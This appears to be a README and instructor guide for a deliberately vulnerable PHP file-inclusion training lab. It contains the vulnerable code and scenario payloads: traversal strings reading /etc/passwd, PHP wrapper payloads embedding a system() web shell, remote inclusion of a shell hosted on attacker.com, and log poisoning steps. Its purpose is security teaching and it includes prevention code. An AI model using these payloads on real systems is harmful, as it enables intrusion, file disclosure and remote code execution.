# 📄 Add Pages Functionality - CyberWolf Training Class

## 🐺 Overview

The "Add Pages" functionality is a key feature of the File Inclusion Lab developed specifically for **CyberWolf Training Class**. This feature demonstrates both Local File Inclusion (LFI) and Remote File Inclusion (RFI) vulnerabilities through a realistic web application scenario.

**Platform**: cyberwolf.wuaze.com  
**Lab Type**: File Inclusion Vulnerabilities  
**Training Level**: Intermediate to Advanced

## 🎯 Educational Objectives

### Primary Learning Goals
1. **Understand File Inclusion Vulnerabilities**
   - Local File Inclusion (LFI) concepts
   - Remote File Inclusion (RFI) techniques
   - Server-Side Request Forgery (SSRF) implications

2. **Master Exploitation Techniques**
   - Directory traversal attacks
   - Filter bypass methods
   - PHP wrapper exploitation
   - Log poisoning techniques

3. **Learn Security Implications**
   - Impact assessment of file inclusion vulnerabilities
   - Real-world attack scenarios
   - Prevention and mitigation strategies

## 🔧 Technical Implementation

### File Structure
```
file inclusion/
├── add.php              # Main Add Pages functionality
├── files/               # Training content directory
│   ├── sample.json      # Basic training file
│   ├── training_content.json  # Comprehensive course material
│   └── cyberwolf_info.json    # Platform information
├── index.php            # Main lab interface
├── msg.txt              # Welcome message with training info
└── fun.php              # Backend functionality
```

### Vulnerability Details

**Vulnerable Code Pattern:**
```php
if(isset($_POST['url'])){
    $url = $_POST['url'];
    if(!strpos($url, ".json")){
        $msg = "Not allowed extension, try (json) extension.";
    }else{
        $urlSplit = explode("/", $url);
        $file = $urlSplit[count($urlSplit)-1];
        get($url, $file);  // Vulnerable function call
    }
}
```

**Security Issues:**
- Weak extension filtering (only checks for ".json" presence)
- No path validation
- Direct file inclusion without sanitization
- Potential for remote file inclusion

## 🧪 Exploitation Scenarios

### Scenario 1: Basic File Access
**Objective**: Access legitimate training files
```
URL: files/sample.json
Result: Displays CyberWolf training content
```

### Scenario 2: Extension Filter Bypass
**Objective**: Bypass the .json extension requirement
```
Techniques:
1. URL Fragment: ../../../etc/passwd#.json
2. Query Parameter: ../../../etc/passwd?.json
3. Null Byte: ../../../etc/passwd%00.json
4. Double Extension: ../../../etc/passwd.txt.json
```

### Scenario 3: PHP Wrapper Exploitation
**Objective**: Use PHP wrappers for advanced attacks
```
Examples:
1. Base64 Encoding: php://filter/convert.base64-encode/resource=../../../etc/passwd#.json
2. ROT13 Encoding: php://filter/string.rot13/resource=config.php#.json
3. Data Wrapper: data://text/plain,<?php system($_GET['cmd']); ?>#.json
```

### Scenario 4: Remote File Inclusion
**Objective**: Include remote malicious files
```
Setup:
1. Host malicious file: http://attacker.com/shell.txt
2. Content: <?php system($_GET['cmd']); ?>
3. Payload: http://attacker.com/shell.txt#.json
```

### Scenario 5: Log Poisoning
**Objective**: Achieve RCE through log file inclusion
```
Steps:
1. Poison access logs with PHP code in User-Agent
2. Include log file: /var/log/apache2/access.log#.json
3. Execute commands through poisoned logs
```

## 📚 Training Materials

### Included JSON Files

#### 1. sample.json
- Basic introduction to CyberWolf Training
- Platform overview and objectives
- Simple exploitation examples

#### 2. training_content.json
- Comprehensive course curriculum
- Detailed learning modules
- Practical exercises and hints
- Security implications discussion

#### 3. cyberwolf_info.json
- Platform information and philosophy
- Course offerings and methodology
- Instructor notes and teaching points
- Contact and support information

## 🎓 Instructor Guide

### Teaching Approach
1. **Start with Legitimate Use**: Show students the intended functionality
2. **Introduce Vulnerabilities**: Explain the security weaknesses
3. **Demonstrate Exploits**: Walk through each exploitation technique
4. **Discuss Impact**: Analyze real-world implications
5. **Cover Prevention**: Teach secure coding practices

### Key Teaching Points
- **Filter Bypass Techniques**: Multiple methods to circumvent restrictions
- **Wrapper Exploitation**: Advanced PHP wrapper usage
- **Impact Assessment**: Understanding the severity of file inclusion
- **Secure Development**: How to prevent these vulnerabilities

### Common Student Mistakes
- Not understanding the difference between LFI and RFI
- Overlooking simple bypass techniques
- Failing to consider log poisoning attacks
- Ignoring the security implications

## 🛡️ Security Considerations

### Vulnerability Impact
- **Confidentiality**: Sensitive file disclosure
- **Integrity**: Potential file modification
- **Availability**: Server compromise and DoS
- **Authentication**: Bypass through config file access
- **Authorization**: Privilege escalation possibilities

### Real-World Examples
- Configuration file disclosure
- Source code exposure
- Database credential theft
- Remote code execution
- Server takeover

## 🔒 Prevention Measures

### Secure Coding Practices
1. **Input Validation**: Strict whitelist validation
2. **Path Sanitization**: Remove directory traversal sequences
3. **File Extension Validation**: Proper extension checking
4. **Absolute Paths**: Use absolute paths instead of relative
5. **Disable Dangerous Functions**: Restrict file inclusion functions

### Example Secure Code
```php
// Secure implementation
$allowed_files = ['sample.json', 'training_content.json', 'cyberwolf_info.json'];
$requested_file = basename($_POST['url']);

if (in_array($requested_file, $allowed_files)) {
    $safe_path = '/safe/directory/' . $requested_file;
    if (file_exists($safe_path)) {
        include $safe_path;
    }
}
```

## 📊 Assessment Criteria

### Student Evaluation
1. **Understanding** (25%): Comprehension of vulnerability concepts
2. **Exploitation** (35%): Successful demonstration of attacks
3. **Analysis** (25%): Impact assessment and risk evaluation
4. **Prevention** (15%): Knowledge of mitigation strategies

### Practical Exercises
- [ ] Access legitimate training files
- [ ] Bypass extension filtering
- [ ] Demonstrate directory traversal
- [ ] Use PHP wrappers effectively
- [ ] Achieve remote code execution
- [ ] Explain security implications
- [ ] Propose prevention measures

## 🔗 Additional Resources

### CyberWolf Training Platform
- **Main Site**: cyberwolf.wuaze.com
- **Lab Access**: cyberwolf.wuaze.com/labs/
- **Solutions**: cyberwolf.wuaze.com/labs/answers.html
- **Status Check**: cyberwolf.wuaze.com/labs/status.php

### External References
- OWASP Testing Guide - File Inclusion
- PHP Security Best Practices
- Web Application Security Testing Methodology
- Common Weakness Enumeration (CWE-98)

## 📞 Support and Contact

### Training Support
- Platform documentation available online
- Instructor assistance during lab sessions
- Community forums for discussion
- Regular content updates and improvements

### Technical Issues
- Check system status at status.php
- Review hosting configuration
- Verify database connectivity
- Ensure proper file permissions

---

**🎯 Lab Completion**

Upon successful completion of this lab, students will have:
- Mastered file inclusion vulnerability exploitation
- Understood the security implications of poor input validation
- Learned multiple bypass techniques and attack vectors
- Gained practical experience with real-world security testing

**🐺 CyberWolf Training Class - Empowering the Next Generation of Security Professionals**
